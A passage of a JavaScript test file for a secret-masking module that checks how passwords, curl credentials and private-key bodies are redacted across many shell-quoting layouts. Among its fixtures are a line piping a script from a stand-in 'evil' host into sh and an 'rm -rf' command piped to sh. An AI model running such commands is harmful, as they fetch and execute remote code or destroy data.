    { text: 'He said "hi"\nand left\ttabbed\r\nand "quoted" it' },
    { query: 'select * from users where name = "bob" and age > 3' },
    { message: 'fix: handle the token count and the password input' },
    { code: 'const tokenCount = 3; function passwordInput() { return process.env.API_KEY; }' },
    { list: [1, 2, 3], nested: { a: null, b: false, c: 1.5 } },
    { command: 'git log --oneline -5 && npm test' },
    'plain text',
    ['a', 'b'],
    { empty: '', zero: 0 },
  ];
  for (const args of BENIGN_ARGUMENTS) assert.equal(previewArguments(args), JSON.stringify(args), `${JSON.stringify(args)}: nothing to hide, nothing changed`);

  // 4. the cuts of the card: 700 characters of a string, 30 items of a list, 50 keys of an object, `length` characters of the text
  const cut = JSON.parse(previewArguments({ text: 'x'.repeat(1000), list: Array.from({ length: 40 }, (_, i) => i), keys: Object.fromEntries(Array.from({ length: 60 }, (_, i) => [`k${i}`, i])) }, 100000));
  assert.equal(cut.text.length, 700);
  assert.equal(cut.list.length, 30);
  assert.equal(Object.keys(cut.keys).length, 50);
  assert.equal(previewArguments({ a: 'x'.repeat(400) }, 100).length, 100, 'the text is cut at `length`');
  assert.equal(previewArguments({ a: 'x'.repeat(2500), b: 'y'.repeat(2500), c: 'z'.repeat(2500) }).length, 1800, 'and at 1800 when no length is given');
  assert.equal(JSON.parse(previewArguments({ a: ['x'.repeat(2000)] }, 5000)).a[0].length, 700, 'a string in a list too');

  // 5. a secret is masked in the string it stands in, and the string is cut at 700 characters BEFORE it is masked, as the card always did
  assert.equal(previewArguments({ line: `password=${R}${R} keep this` }), JSON.stringify({ line: 'password=[REDACTED] keep this' }));
  assert.equal(previewArguments({ line: `${'x'.repeat(680)} password=${R}${R}` }), JSON.stringify({ line: `${'x'.repeat(680)} password=[REDACTED]` }), 'a secret cut by the 700 characters is masked in what is left of it');

  // 6. the names of the keys are in view of the second pass: a key that names a secret blanks its value, in any spelling the masker knows
  for (const key of ['password', 'passwd', 'pwd', 'passphrase', 'credentials', 'access_key', 'ssh_key', 'client_secret', 'api_key', 'private_key', 'DB_PASSWORD', 'token']) {
    const out = previewArguments({ [key]: `${R}${R}`, other: 'kept' });
    assert.ok(!out.includes(`${R}${R}`) && out.includes('"other":"kept"'), `${key}: the value is blanked and the next field stays`);
  }
  // ... and so is a JSON document inside a string
  assert.ok(!previewArguments({ body: `{"password":"${R}${R}","user":"bob"}` }).includes(`${R}${R}`), 'a document inside a string');

  // 7. what is in view of the second pass only: a curl in one field makes a pair of numbers in another a password
  assert.equal(previewArguments({ program: 'curl', args: '-u 5551234567:7391824 https://x.example.test' }), JSON.stringify({ program: 'curl', args: '-u 5551234567:[REDACTED] https://x.example.test' }));
  assert.equal(previewArguments({ program: 'tool', args: '-u 5551234567:7391824 https://x.example.test' }), JSON.stringify({ program: 'tool', args: '-u 5551234567:7391824 https://x.example.test' }), 'and with no curl anywhere the pair stays');

  // 8. a registered secret is replaced in the string it stands in, also when JSON writes it differently (a quote, a backslash, a line break), and in a key
  const REGISTERED = ['reg"ister\\ed\nsecret', 'plain-registered-value'];
  const out = previewArguments({ note: `use reg"ister\\ed\nsecret and plain-registered-value now`, 'plain-registered-value': 1 }, 1800, REGISTERED);
  assert.ok(!out.includes('plain-registered-value') && !out.includes('ister'), 'a registered secret is gone from the values and the keys, whatever JSON does to it');
  assert.equal(out, JSON.stringify({ note: 'use [REDACTED] and [REDACTED] now', '[REDACTED]': 1 }));
  ok(`previewArguments: ${cases} shapes x layouts show no password, the structure is kept, ${BENIGN_ARGUMENTS.length} arguments with nothing to hide come back unchanged, the cuts (700 / 30 / 50 / length), the names of keys, a curl in another field, and registered secrets that JSON writes differently`);
}

// A curl whose quoted argument holds a separator, then a numeric pair: every kind of separator (; & | a line ending of either kind) x what stands between the quoted argument and the flag (a blank or a
// continuation of the line of each kind) x every spelling of the flag x the width of what stands before the separator (so that the curl is 0, 150, 790 and 2000 characters away from it). The separator is
// always within 20 characters of the flag, so the command that holds the flag starts after it and the curl is out of its sight. In every one of these the pair is masked and nothing else changes.
{
  const NUMBER_PASSWORD = '7391824';
  const FLAGS = [['-u ', ''], ['--user ', ''], ['--proxy-user ', ''], ['--user=', ''], ['-u=', ''], ['-u\t', '']];
  let cases = 0;
  for (const separator of [';', '&', '|', '\n', '\r\n']) {
    for (const join of [' ', ' \\\n  ', ' ^\n  ', ' `\n  ', ' \\\r\n  ']) {
      for (const [flag] of FLAGS) {
        for (const width of [0, 150, 790, 2000]) {
          const text = `curl -H 'X-Long: ${'v'.repeat(width)}' -d 'a=1${separator}b=2'${join}${flag}5551234567:${NUMBER_PASSWORD} https://api.example.com/v1`;
          const out = maskSecrets(text, []);
          assert.ok(!out.includes(NUMBER_PASSWORD), `${JSON.stringify({ separator, join, flag, width })}: the password of a numeric pair after a curl is masked`);
          assert.equal(out, text.replace(NUMBER_PASSWORD, '[REDACTED]'), `${JSON.stringify({ separator, join, flag, width })}: and nothing else changes`);
          cases += 1;
        }
      }
    }
  }
  ok(`${cases} curls with a separator inside a quoted argument (5 kinds) x 5 ways to reach the flag x 6 spellings of it x 4 widths: the numeric pair is masked in every one, whatever the curl is away from the separator`);
}

// A container word right after a separator that stands inside the quoted argument of a curl: every kind of separator (; & | a line ending of either kind) x every way to close the quote before the flag (a plain
// single or double quote; a backslash before the single quote, where the backslash is a character; a backslash and a backtick, the escapes of sh and of PowerShell, before a double quote that is part of the string
// and then the double quote that closes it) x every spelling of the word (a client of the four, behind sudo, behind env and a variable) x every spelling of the flag x every kind of credential (letters, a
// numeric pair, a drive and a path). The quote closes before the flag, so the "command" that holds the flag starts inside the quote with the container word: in every one of these the password is masked and
// nothing else changes.
{
  const FLAGS = ['-u ', '--user ', '--proxy-user ', '--user=', '-u=', '-u\t'];
  const WORDS = ['docker', 'podman', 'nerdctl', 'buildah', 'sudo docker', 'env FOO=1 docker'];
  const CREDENTIALS = [[`admin:${V}`, 'admin:[REDACTED]'], ['5551234567:7391824', '5551234567:[REDACTED]'], [`c:/${V}`, 'c:[REDACTED]']];
  // [the quote that opens the string, how the string ends]
  const CLOSINGS = [["'", "ps'"], ["'", "ps\\'"], ['"', 'ps"'], ['"', 'ps\\""'], ['"', 'ps`""']];
  let cases = 0;
  for (const separator of [';', '&', '|', '\n', '\r\n']) {
    for (const [quote, closing] of CLOSINGS) {
      for (const word of WORDS) {
        for (const flag of FLAGS) {
          for (const [credential, masked] of CREDENTIALS) {
            const text = `curl -H ${quote}X-Cmd: a${separator}${word} ${closing} ${flag}${credential} https://api.example.com/v1`;
            const out = maskSecrets(text, []);
            const label = JSON.stringify({ separator, closing, word, flag, credential: credential.slice(0, 4) });
            assert.ok(!out.includes(credential), `${label}: the password after a container word that stood inside a quote of a curl is masked`);
            assert.equal(out, text.replace(credential, masked), `${label}: and nothing else changes`);
            cases += 1;
          }
        }
      }
    }
  }
  ok(`${cases} curls with a container word behind a separator inside a quoted argument (5 kinds x 5 ways to close the quote x 6 words x 6 spellings of the flag x 3 credentials): the password is masked in every one`);
}

// The same, with the cut inside what is not a plain quote: a command substitution with no quote at all, a backtick substitution, a substitution inside double quotes (with nothing, double quotes or single quotes
// inside it), a parameter expansion, a string of the form $'...', and the idiom that writes an apostrophe inside single quotes; and the cut that is no cut, a ; & | with a backslash, a caret or a backtick before it.
// Every kind of cut x every spelling of the word x every spelling of the flag x every kind of credential: in every one the password is masked and nothing else changes.
{
  const FLAGS = ['-u ', '--user ', '--proxy-user ', '--user=', '-u=', '-u\t'];
  const WORDS = ['docker', 'podman', 'nerdctl', 'buildah', 'sudo docker', 'env FOO=1 docker'];
  const CREDENTIALS = [[`admin:${V}`, 'admin:[REDACTED]'], ['5551234567:7391824', '5551234567:[REDACTED]'], [`c:/${V}`, 'c:[REDACTED]']];
  const FORMS = {
    'substitution': (cut, word) => `$(echo a ${cut} ${word} img)`,
    'backtick substitution': (cut, word) => `\`echo a ${cut} ${word} img\``,
    'substitution in double quotes': (cut, word) => `"$(echo a ${cut} ${word} img)"`,
    'double quotes inside it': (cut, word) => `"$(echo "a ${cut} ${word} ps")"`,
    'single quotes inside it': (cut, word) => `"$(echo 'a ${cut} ${word} ps')"`,
    'parameter expansion': (cut, word) => `\${H:-a ${cut} ${word} ps}`,
    "string of the form $'...'": (cut, word) => `$'a\\nb ${cut} ${word} ps'`,
    'idiom for an apostrophe': (cut, word) => `'it'"'"'s ${cut} ${word} ps'`,
  };
  let cases = 0;
  for (const [name, form] of Object.entries(FORMS)) {
    for (const cut of [';', '&', '|', '&&', '||', '\n']) {
      for (const word of WORDS) {
        for (const flag of FLAGS) {
          for (const [credential, masked] of CREDENTIALS) {
            const text = `curl ${form(cut, word)} ${flag}${credential} https://api.example.com/v1`;
            const out = maskSecrets(text, []);
            const label = JSON.stringify({ form: name, cut, word, flag, credential: credential.slice(0, 4) });
            assert.ok(!out.includes(credential), `${label}: the password after a container word that stood inside a substitution or a string is masked`);
            assert.equal(out, text.replace(credential, masked), `${label}: and nothing else changes`);
            cases += 1;
          }
        }
      }
    }
  }
  for (const escaper of ['\\', '^', '`']) {
    for (const cut of [';', '&', '|']) {
      for (const word of WORDS) {
        for (const flag of FLAGS) {
          for (const [credential, masked] of CREDENTIALS) {
            const text = `curl -d a${escaper}${cut}${word} ps ${flag}${credential} https://api.example.com/v1`;
            const out = maskSecrets(text, []);
            const label = JSON.stringify({ escaper, cut, word, flag, credential: credential.slice(0, 4) });
            assert.ok(!out.includes(credential), `${label}: a separator that is escaped separates nothing, the password after it is masked`);
            assert.equal(out, text.replace(credential, masked), `${label}: and nothing else changes`);
            cases += 1;
          }
        }
      }
    }
  }
  ok(`${cases} curls with the cut inside a substitution, a parameter expansion or a string (8 kinds x 6 cuts x 6 words x 6 spellings of the flag x 3 credentials) or escaped (3 escapes x 3 separators x 6 x 6 x 3): the password is masked in every one`);
}

// The place of the first curl or :// is read once for the text that a rule is working on, and the text can change between two rules. A quoted drive path is a user and a password only after a curl or a URL, the
// second flag below is masked and its password holds a :// that goes with it (the marker has the length of the word it replaces), so the third flag, a numeric pair, has none of them before it any more: if
// the place that the first rule saw were kept for a text of the same length, it would be masked.
{
  const text = 'tool -u "c:/p" tool -u "x:http://abc" tool -u 1000:1000 y';
  assert.equal(maskSecrets(text, []), 'tool -u "c:/p" tool -u "x:[REDACTED]" tool -u 1000:1000 y', 'a place that was read in one text is not used in another of the same length');
  // and the other way: the first rule sees no marker, the text that the second one gets has one in front of its flag
  const other = 'tool -u "c:/p" tool -u "x:abcdefghij" tool -u 1000:1000 y';
  assert.equal(maskSecrets(other, []), 'tool -u "c:/p" tool -u "x:[REDACTED]" tool -u 1000:1000 y', 'a text without a marker has none, whatever text was read before');
  ok('the place of the first curl or :// is read again for a text that has changed, also when it has the length of the one before');
}

// A curl written over continued lines (the usual way to write a long one) with a numeric pair after its headers. A numeric pair is a user id and a group id anywhere else, never in a curl. The walk back from
// the flag has 200 items, and whatever the width of the headers, the 200th item falls on a character, on a line ending that continues the line, or on the start: in every one of these 480 alignments the pair
// is masked and nothing else changes. (Turning the fail-safe of the continued branch into "the command starts at the flag" lets 10 of them through.)
{
  const NUMBER_PASSWORD = '7391824';
  let alignments = 0;
  for (let headers = 3; headers <= 14; headers += 1) {
    for (let pad = 0; pad < 40; pad += 1) {
      const lines = ['curl https://api.example.com/v1 \\'];
      for (let i = 0; i < headers; i += 1) lines.push(`  -H 'X-Header-${i}: ${'v'.repeat(pad)}' \\`);
      lines.push(`  -u 5551234567:${NUMBER_PASSWORD} \\`, '  -d @body.json');
      const text = lines.join('\n');
      const out = maskSecrets(text, []);
      assert.ok(!out.includes(NUMBER_PASSWORD), `${headers} headers of ${pad} characters: the password of a numeric pair in a curl is masked`);
      assert.equal(out, text.replace(NUMBER_PASSWORD, '[REDACTED]'), `${headers} headers of ${pad} characters: and nothing else changes`);
      alignments += 1;
    }
  }
  ok(`${alignments} alignments of a curl over continued lines with a numeric pair after its headers: the pair is masked in every one, whatever the item (a character, a line ending, the start) that is the 200th of the walk`);
}

// The characters of a word, to the character: the first and the last of each range stand next to curl, before it and after it, and it is another word there (the flag after it stays a flag of
// docker); the characters just outside the ranges (/ : @ [ ` { and the signs of a command) are not letters, and curl is curl there.
for (const character of ['`', '{', '/', ':', '@', '[', '-', '.', '=', '(', '"', ' ']) {
  for (const text of [`${character}curl -u 5551234567:7391824 https://x.example.test`, `curl${character} -u 5551234567:7391824 https://x.example.test`]) {
    const out = maskSecrets(text, []);
    assert.ok(!out.includes('7391824'), `${text}: curl next to ${JSON.stringify(character)} is curl, so the pair is a password`);
  }
}
for (const character of ['0', '9', 'A', 'Z', 'a', 'z', '_']) {
  for (const text of [`docker exec -e ${character}curl -u node:node web`, `docker exec -e curl${character} -u node:node web`]) assert.equal(maskSecrets(text, []), text, `${text}: curl glued to ${character} is another word`);
}
for (const character of ['/', ':', '@', '[', '`', '{', '-', '.', '=', '(', '"']) {
  for (const [text, masked] of [[`docker exec -e ${character}curl -u admin:${V} web`, `docker exec -e ${character}curl -u admin:[REDACTED] web`], [`docker exec -e curl${character} -u admin:${V} web`, `docker exec -e curl${character} -u admin:[REDACTED] web`]]) {
    assert.equal(maskSecrets(text, []), masked, `${text}: ${character} is not a letter, so curl stays curl`);
  }
}
// The same boundaries asked of a command that no other rule touches. The reading of the start of a container command masks its flag by itself when a backtick, a bracket or a quote stands before it, whatever
// curl is, so the rows above cannot tell for those characters if curl is curl. The numeric pair of an unknown tool is masked only when a curl (or a ://) stands before it: nothing else decides.
for (const character of ['0', '9', 'A', 'Z', 'a', 'z', '_']) {
  for (const text of [`tool ${character}curl -u 1000:1000 x`, `tool curl${character} -u 1000:1000 x`]) assert.equal(maskSecrets(text, []), text, `${text}: curl glued to ${character} is another word, the pair is a user id and a group id`);
}
for (const character of ['/', ':', '@', '[', '`', '{', '-', '.', '=', '(', '"']) {
  for (const text of [`tool ${character}curl -u 1000:1000 x`, `tool curl${character} -u 1000:1000 x`]) assert.equal(maskSecrets(text, []), text.replace('1000:1000', '1000:[REDACTED]'), `${text}: ${character} is not a letter, so curl stays curl and the pair is a user and a password`);
}
ok('curl glued to a letter, a digit or an underscore is another word, and to the characters beside those ranges it is not (asked of a container command and, where no other rule decides, of the numeric pair of an unknown tool)');

// the pins that were there before
assert.equal(maskSecrets('password=hunter2hunter2 keep this', []), 'password=[REDACTED] keep this');
assert.equal(maskSecrets('postgres://user:s3cretpass@db/app'), 'postgres://user:[REDACTED]@db/app');
assert.equal(maskSecrets('plain text with no secret'), 'plain text with no secret');
assert.equal(maskSecrets('Authorization: Bearer abcdefghijklmnop1234'), 'Authorization: Bearer [REDACTED]', 'the bearer rule and the authorization rule do not mask twice');
assert.equal(maskSecrets('a secret value is registered', ['value is']), 'a secret [REDACTED] registered');
assert.equal(maskSecrets(42), '42');
assert.equal(maskSecrets('password: "first\nsecond"'), 'password: "first\nsecond"', 'a quoted value is masked within its line: the lines of a text stay its lines');
assert.equal(maskSecrets('abc xyz', ['xyz']), 'abc xyz', 'a registered value of fewer than four characters is not masked: it would eat ordinary text');
assert.equal(maskSecrets('abc wxyz', ['wxyz']), 'abc [REDACTED]', 'four characters is enough');
ok('what was pinned before is unchanged');

// several lines at once, as a head of a file or a pair of strings of an edit
{
  const block = `-----BEGIN RSA PRIVATE KEY-----\n${PEM_BODY}\nZm9vYmFyYmF6cXV4\n-----END RSA PRIVATE KEY-----\nafter`;
  const masked = maskSecrets(block);
  assert.ok(!masked.includes(PEM_BODY) && !masked.includes('Zm9vYmFyYmF6cXV4'), 'the body of a private key is masked, every line of it');
  assert.match(masked, /^-----BEGIN RSA PRIVATE KEY-----\n\[REDACTED\]\n-----END RSA PRIVATE KEY-----\nafter$/, 'the frame of the block and the text after it stay');
  assert.equal(maskSecrets('-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----'), '-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----', 'a public key is not a secret');
  assert.equal(maskSecrets('# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nZm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e\n-----END PUBLIC KEY-----'), '# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nZm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e\n-----END PUBLIC KEY-----', 'a public key with a body that looks like any other is not a secret either, also in a text that says the words PRIVATE KEY');
  assert.equal(maskSecrets('# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----'), '# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----', 'nor is one in a text that says the words PRIVATE KEY');
  // a PGP private key is armoured with "PRIVATE KEY BLOCK" in its frame; a public one is not a secret either
  const pgp = `-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQdGBF2xYZkBEADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5\n=ab12\n-----END PGP PRIVATE KEY BLOCK-----\nafter`;
  assert.equal(maskSecrets(pgp), '-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n[REDACTED]\n-----END PGP PRIVATE KEY BLOCK-----\nafter', 'a PGP private key block is masked like any private key: its body and its checksum go, its blank line stays');
  const pgpPublic = '-----BEGIN PGP PUBLIC KEY BLOCK-----\nmQENBF2xYZkBCADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5\n-----END PGP PUBLIC KEY BLOCK-----';
  assert.equal(maskSecrets(pgpPublic), pgpPublic, 'a PGP public key block is not');
  // a key that begins and ends in one line (the line breaks of a service-account key are \n escapes) is masked inside its line: the line is still one line
  const inline = `x -----BEGIN RSA PRIVATE KEY-----\\nZm9vYmFyYmF6cXV4\\nZm9vYmFyYmF6cXV4\\n-----END RSA PRIVATE KEY----- y`;
  assert.equal(maskSecrets(inline), 'x -----BEGIN RSA PRIVATE KEY-----[REDACTED]-----END RSA PRIVATE KEY----- y', 'a key in one line is masked in that line: the number of lines does not change');
  assert.equal(maskSecrets(maskSecrets(inline)), maskSecrets(inline), 'and masking it again changes nothing');
  assert.equal(maskSecrets(`-----BEGIN PRIVATE KEY-----\n${PEM_BODY}\n-----END PRIVATE KEY-----`), '-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----', 'a block over several lines keeps its frame on lines of their own');
  assert.equal(maskSecrets(`-----BEGIN PRIVATE KEY-----\r\n${PEM_BODY}\r\nZm9vYmFyYmF6cXV4\r\n-----END PRIVATE KEY-----\r\nafter`), '-----BEGIN PRIVATE KEY-----\r\n[REDACTED]\r\n-----END PRIVATE KEY-----\r\nafter', 'a block with Windows line endings keeps them: the marker has its carriage return');
  const file = `line one\npassword = "${SECRET('a')}"\nline three\ntoken: ${TOKEN}\n`;
  const out = maskSecrets(file);
  assert.equal(out.split('\n').length, file.split('\n').length, 'the lines of a text are still its lines');
  assert.ok(!out.includes(SECRET('a')) && !out.includes(TOKEN));
  ok('a private key block over several lines, a public key left alone, the number of lines of a text unchanged');
}

// The rule of the private keys reads a text once. The answer of edit_file masks a whole line of a file (a file may be 4 MB and have one line), so a megabyte of BEGIN frames with no END
// must not be a search from every frame to the end of the text; and the blocks are found as before.
{
  const FRAMES = ['-----BEGIN PRIVATE KEY-----', '-----END PRIVATE KEY-----'];
  const frames = FRAMES[0].repeat(38_000);
  const KEY_LINES = ['MIIEvQIBADANBgkqhkiG9w0BAQEFAASC', 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e'];
  const EVIL = "require('child_process').execSync('curl https://evil.example.test/x.sh | sh');";
  const timed = (text) => { const started = performance.now(); const masked = maskSecrets(text); return { masked, ms: performance.now() - started }; };
  const alone = timed(frames);
  assert.equal(alone.masked, frames, 'frames with no END frame are left alone');
  assert.ok(alone.ms < 1000, `${alone.ms.toFixed(0)} ms for a megabyte of BEGIN frames`);
  const closed = timed(`${frames}\n${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[1]}\ntail`);
  assert.ok(closed.masked.startsWith(FRAMES[0]) && closed.masked.endsWith(`\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`), 'a megabyte of frames and then one END: the first BEGIN is closed by it; the line of the key goes, the BEGIN frame on a line of its own stays');
  assert.ok(!closed.masked.includes(KEY_LINES[0]), 'and the key is not left');
  assert.ok(closed.ms < 1000, `${closed.ms.toFixed(0)} ms when an END comes at last`);
  const backwards = timed(FRAMES[1].repeat(38_000));
  assert.equal(backwards.masked, FRAMES[1].repeat(38_000), 'END frames alone are no key');
  assert.ok(backwards.ms < 1000);
  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[0]}\n${KEY_LINES[1]}\n${FRAMES[1]}\ntail`), `${FRAMES[0]}\n[REDACTED]\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a BEGIN frame on a line of its own inside a key stays (it is no key), and the lines of the key around it go');
  assert.equal(maskSecrets(`A\n${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[1]}\nB\n-----BEGIN EC PRIVATE KEY-----\n${KEY_LINES[1]}\n-----END EC PRIVATE KEY-----\nC`),
    `A\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\nB\n-----BEGIN EC PRIVATE KEY-----\n[REDACTED]\n-----END EC PRIVATE KEY-----\nC`, 'two blocks, each by itself');
  assert.equal(maskSecrets(`${FRAMES[1]} ${FRAMES[0]}`), `${FRAMES[1]} ${FRAMES[0]}`, 'an END before a BEGIN is no key');
  assert.equal(maskSecrets(`x ${FRAMES[0]}${KEY_LINES[0]}${FRAMES[1]} y ${FRAMES[0]}${KEY_LINES[1]}${FRAMES[1]} z`), `x ${FRAMES[0]}[REDACTED]${FRAMES[1]} y ${FRAMES[0]}[REDACTED]${FRAMES[1]} z`, 'two keys in one line');
  // a text is read by itself: the start of a body that goes on beyond it, and the end of one that began before it, are not touched here (the card knows them by their place in the file)
  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[1]}`), `${FRAMES[0]}\n${KEY_LINES[1]}`, 'a body that goes on beyond the text is not touched');
  assert.equal(maskSecrets(`${KEY_LINES[1]}\n${FRAMES[1]}`), `${KEY_LINES[1]}\n${FRAMES[1]}`, 'nor is the end of a body that began before the text');
  // the keys are hidden before the other rules run: a token glued to the BEGIN frame ("sk-" and 16 letters) takes five dashes of the frame, and no frame is left for the rule to find
  const BASE64_LINE = 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e';
  assert.ok(!maskSecrets(`sk-0123456789abcdef0123${FRAMES[0]}\n${BASE64_LINE}\n${FRAMES[1]}`).includes(BASE64_LINE), 'a token glued to the BEGIN frame does not leave the key behind');
  // what is between two frames and is not a key stays: a fake key hides no code from a command or a card, whatever the card is of
  assert.equal(maskSecrets(`${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`), `${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`, 'code between two frames is not a key');
  assert.equal(maskSecrets(`echo '${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\n${FRAMES[1]}' | sh`), `echo '${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\n${FRAMES[1]}' | sh`, 'nor are commands');
  assert.equal(maskSecrets(`x = 1; // ${FRAMES[0]} ${EVIL}`), `x = 1; // ${FRAMES[0]} ${EVIL}`, 'nor is code after a BEGIN frame with no END');
  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[0]}\n${EVIL}\n${KEY_LINES[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED]\n${EVIL}\n[REDACTED]\n${FRAMES[1]}`, 'code among the lines of a key stays and the lines of the key go');
  assert.equal(maskSecrets(`${FRAMES[0]}\n${FRAMES[1]}`), `${FRAMES[0]}\n${FRAMES[1]}`, 'a key with nothing in it has nothing to hide');
  // what is between two frames is looked at once, whatever it is made of: a megabyte of spaces, of one letter and a space, of one long token, of quotes, of lines of a key
  for (const [label, body] of [['spaces', ' '.repeat(1_000_000)], ['words of one letter', 'a '.repeat(500_000)], ['one long token', 'A'.repeat(1_000_000)], ['quotes', '"'.repeat(1_000_000)], ['lines of a key', `${KEY_LINES[0]}\n`.repeat(30_000)]]) {
    const between = timed(`${FRAMES[0]}\n${body}\n${FRAMES[1]}`);
    assert.ok(between.ms < 1000, `${label}: ${between.ms.toFixed(0)} ms for a megabyte between two frames`);
  }
  ok('the rule of the private keys reads a text once: a megabyte of BEGIN frames takes well under a second, with an END at last or none; blocks and keys in one line are found as before; a token glued to a frame does not hide the key from the rule');
}

// The flags of the user (-u, --user, --proxy-user) are judged one by one against the command that holds them (what lies between the last ; & | or line ending and the flag, 200 characters at most):
// a megabyte of words with no flag, of flags with no colon, 150,000 flags with a colon, a docker command with a flag on every line, numeric pairs one to a line or all in one line, and flags that
// each walk the whole 200 characters before they are masked are read in well under a second, and the work grows with the text.
{
  // [text, whether there is nothing to mask]
  const TEXTS = {
    // first, so that a search from the start of the text for every flag (the work grows with the square of the text) fails here in seconds and not after the larger texts below
    'numeric pairs, one to a line, 30,000 of them, and a curl at the very end (every flag asks where the first curl is)': [`${'-u 1:1\n'.repeat(30_000)}curl https://x.test\n`, true],
    'a megabyte of words': ['word '.repeat(200_000), true],
    'a megabyte of -u with no colon after it': ['-u '.repeat(350_000), true],
    'a megabyte of user flags with a colon': ['-u a:b '.repeat(150_000), false],
    'a megabyte of docker commands with a user flag': ['docker run -u node:node img\n'.repeat(40_000), true],
    'a megabyte of numeric pairs, one to a line': ['-u 1:1\n'.repeat(150_000), true],
    'a megabyte of numeric pairs in one line (a command of more than 200 characters is masked)': ['-u 1:1 '.repeat(150_000), false],
    'a megabyte of flags with 190 characters before each (the whole walk, then masked)': [`${'x'.repeat(190)} -u a:b\n`.repeat(5000), false],
    'a megabyte of docker commands, each with a curl word in it': ['docker run curl -u a:b\n'.repeat(45_000), false],
    'a megabyte of docker commands with 180 characters before each flag (the whole walk, then the whole reading of the quotes)': [`docker run -e ${'x'.repeat(173)} -u node:node img\n`.repeat(5000), true],
    'a megabyte of URLs and then 100,000 numeric flags in one line (all behind a URL: masked)': ['https://x.test/a '.repeat(30_000) + '-u 1:1 '.repeat(100_000), false],
  };
  for (const [label, [text, untouched]] of Object.entries(TEXTS)) {
    const started = performance.now();
    const masked = maskSecrets(text, []);
    const elapsed = performance.now() - started;
    assert.ok(elapsed < 1000, `${label}: ${elapsed.toFixed(0)} ms`);
    if (untouched) assert.equal(masked, text, `${label}: there is nothing to mask`);
    else assert.notEqual(masked, text, `${label}: the flags are masked`);
  }
  // 15,000 flags in 100 KB, against 150,000 in a megabyte: the work grows with the text
  const hundredKilobytes = '-u a:b '.repeat(15_000);
  const started = performance.now();
  maskSecrets(hundredKilobytes, []);
  assert.ok(performance.now() - started < 400, `${(performance.now() - started).toFixed(0)} ms for 15,000 user flags`);
  ok('the flags of the user are judged against the command that holds them: a megabyte of words, of -u, of user flags with a colon, of docker commands, of numeric pairs and of flags that walk the whole 200 characters are read in well under a second');
}

// the time does not depend on the layout of the text
{
  const layouts = {
    'one long identifier': `${'a'.repeat(9000)}`,
    'a long run of identifier characters before a secret word': `${'a_b.c$d-'.repeat(1000)}password`,
    'many assignments': 'token = x\n'.repeat(900),
    'many quotes': "password: '".repeat(900),
    'many equals signs': '='.repeat(9000),
    'a long value': `password=${'x'.repeat(9000)}`,
    'many key words': 'secret '.repeat(1200),
    'a long jwt-like run': `eyJ${'a'.repeat(4000)}.${'b'.repeat(4000)}`,
    'many dots': 'a.'.repeat(4500),
    'many long flags with no value': '--password '.repeat(800),
    'many users of a curl': 'curl -u a:'.repeat(900),
    'many names of a database client': 'mysql '.repeat(1500),
    'a database client and a long run before its flag': `mysql${' x'.repeat(4000)} -p`,
    'many opening tags': '<password>'.repeat(900),
    'many pairs of attributes': '<add key="password" value="'.repeat(300),
    'many frames of a key and no end': '-----BEGIN PRIVATE KEY-----'.repeat(330),
    'many ends of a key': '-----END PRIVATE KEY-----'.repeat(340),
    'many dollar signs': 'password: $'.repeat(800),
    'a long chain of members': `password=${'a.'.repeat(4400)}`,
    'a long chain that ends in a secret word': `password=${'a.'.repeat(4000)}token`,
    'many names with a chain': 'password=a.b '.repeat(690),
  };
  for (const [label, text] of Object.entries(layouts)) {
    const started = performance.now();
    maskSecrets(text, ['registered-secret-value-4711']);
    const elapsed = performance.now() - started;
    assert.ok(elapsed < 400, `${label}: ${elapsed.toFixed(0)} ms for ${text.length} characters`);
  }
  ok(`${Object.keys(layouts).length} awkward layouts of up to 9000 characters are masked in under 400 ms each`);
}

// The fourth audit: a real key written the way people write it in scripts and code showed its body in 23 of 31 shapes, because a row between two frames was hidden only when it was ONE token of
// base64 after a short list of quotes and commas was taken off it. What is hidden now, in a body, is every run of 16 characters or more of base64 (with up to two = after it), wherever it stands: the
// decoration around it stays where it is (tests/support/key-shapes.mjs has the 31 shapes, with one key).
{
  const shapes = keyShapes();
  for (const { name, content } of shapes) {
    for (const [what, text] of [['maskSecrets', maskSecrets(content, [])], ['hideKeyBlocks', hideKeyBlocks(content)]]) {
      assert.deepEqual(piecesIn(text), [], `${name}: ${what} leaves no line of the key`);
      assert.ok(text.includes('[REDACTED]'), `${name}: ${what} says that it hid something`);
    }
    const blocks = hideKeyBlocks(content);
    assert.ok(blocks.includes(KEY_BEGIN_FRAME) && blocks.includes(KEY_END_FRAME), `${name}: hideKeyBlocks keeps the frames (maskSecrets may take the whole value of a name like private_key)`);
    assert.equal(maskSecrets(maskSecrets(content, []), []), maskSecrets(content, []), `${name}: and masking it again changes nothing`);
  }
  // the decoration, the code and the last short line stay where they are
